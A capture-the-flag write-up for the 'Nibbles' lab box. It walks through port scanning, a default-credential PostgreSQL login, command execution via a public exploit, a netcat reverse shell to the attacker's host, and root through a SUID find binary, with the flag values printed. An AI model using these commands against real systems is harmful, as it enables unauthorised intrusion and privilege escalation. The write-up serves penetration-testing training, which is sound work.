# CTF Writeup: Nibbles

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.230.47
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 17:05 EST
Nmap scan report for 192.168.230.47
Host is up (0.030s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE  SERVICE      VERSION
21/tcp   open   ftp          vsftpd 3.0.3
22/tcp   open   ssh          OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
|_  256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
80/tcp   open   http         Apache httpd 2.4.38 ((Debian))
|_http-title: Enter a title, displayed at the top of the window.
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.9
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Not valid before: 2020-04-27T15:41:47
|_Not valid after:  2030-04-25T15:41:47
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 (92%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   31.24 ms 192.168.45.1
2   31.24 ms 192.168.45.254
3   31.42 ms 192.168.251.1
4   31.45 ms 192.168.230.47

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.43 seconds
```

There seems to be an running postgresql database on an non-default port. Let's try to connect to it, using default credentials postgres:postgres

```
psql -h 192.168.230.47 -p 5437 -U postgres
Password for user postgres: 
psql (17.6 (Debian 17.6-1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
Type "help" for help.

postgres=#
```

We can list all databases with

```
\l
Name    |  Owner   | Encoding | Locale Provider |   Collate   |    Ctype    | Locale | ICU Rules |   Access privileges   
-----------+----------+----------+-----------------+-------------+-------------+--------+-----------+-----------------------
 postgres  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | 
 template0 | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | =c/postgres          +
           |          |          |                 |             |             |        |           | postgres=CTc/postgres
 template1 | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | =c/postgres          +
           |          |          |                 |             |             |        |           | postgres=CTc/postgres
(3 rows)
```

Let's try and connect to the non-default databases first. It's not possible to connect to "template0", due to us not having the correct privileges for it. But it worked for template1.

```
\c template1
psql (17.6 (Debian 17.6-1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
You are now connected to database "template1" as user "postgres".
```

When trying to list tables on the database "postgres & template1" it didn't prompted us with any.

```
postgres=# \dt
Did not find any relations.
```

## Vulnerability Assessment

Which means we need to find another way to gain initial access. One way would be finding an CVE on the version we discovered in our port scan PostgreSQL DB 11.3 - 11.9. Utilized the following exploit:

```
https://www.exploit-db.com/exploits/50847
```

## Initial Access

Downloaded the exploit locally. It is possible to execute commands on the system, when authenticated.

```
python3 exploit.py -i 192.168.230.47 -p 5437 -U postgres -P postgres -c whoami

[+] Connecting to PostgreSQL Database on 192.168.230.47:5437
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 11.7 is likely vulnerable
[+] Creating table _3984d6175ba18504b1db701d3d9ce235
[+] Command executed

postgres

[+] Deleting table _3984d6175ba18504b1db701d3d9ce235
```

In order to gain RCE, I will utilize netcat. First of all I will check if the binary is already on the target system.

```
python3 exploit.py -i 192.168.230.47 -p 5437 -U postgres -P postgres -c 'which nc'

[+] Connecting to PostgreSQL Database on 192.168.230.47:5437
[+] Connection to Database established
[+] Checking PostgreSQL version
[+] PostgreSQL 11.7 is likely vulnerable
[+] Creating table _2cbf57c63eeea455d5cfa3bd20d1df5e
[+] Command executed

/usr/bin/nc

[+] Deleting table _2cbf57c63eeea455d5cfa3bd20d1df5e
```

Indeed it is! Which means we don't have to download it onto the target.

I will start up an listener on port 443

```
nc -lvnp 443
```

Utilized following command in order to try to get RCE.

```
python3 exploit.py -i 192.168.230.47 -p 5437 -U postgres -P postgres -c 'nc 192.168.45.165 443 -e /bin/bash'
```

This didn't work! I'm assuming the firewall blocks port 443. Let's try and use the same setup with port 80.

```
nc -lvnp 80
```

```
python3 exploit.py -i 192.168.230.47 -p 5437 -U postgres -P postgres -c 'nc 192.168.45.165 80 -e /bin/bash'
```


Gained RCE as user "postgres".

```
nc -lvnp 80 
listening on [any] 80 ...
connect to [192.168.45.165] from (UNKNOWN) [192.168.230.47] 58840
whoami
postgres
```


## Privilege Escalation

Performed shell hardening in order to get an better shell.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Viewed all existing users on the target system in order to 

```
postgres@nibbles:/$ cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
wilson:x:1000:1000:wilson,,,:/home/wilson:/bin/bash
postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

Retrieved local.txt in /home/wilson

```
822cae7b79d4fea12ad49b6133f5bf47
```

I couldn't find any credentials to perform lateral movement on the target system, so I decided to maybe enumerate SUID's and check if I can utilize one to compromise the server entirely and gain "root".

```
postgres@nibbles:/$ find / -perm /4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/find
/usr/bin/sudo
/usr/bin/umount
```

Utilizing gtfobins.github.io It recommended me the following syntax for the /usr/bin/find binary.

```
postgres@nibbles:/$ /usr/bin/find . -exec /bin/sh -p \; -quit
/usr/bin/find . -exec /bin/sh -p \; -quit
# whoami
whoami
root
```

Gained Root Shell & retrieved proof.txt in /root directory.

```
a07e99feb13be4b5932422acbe8d1a30
```
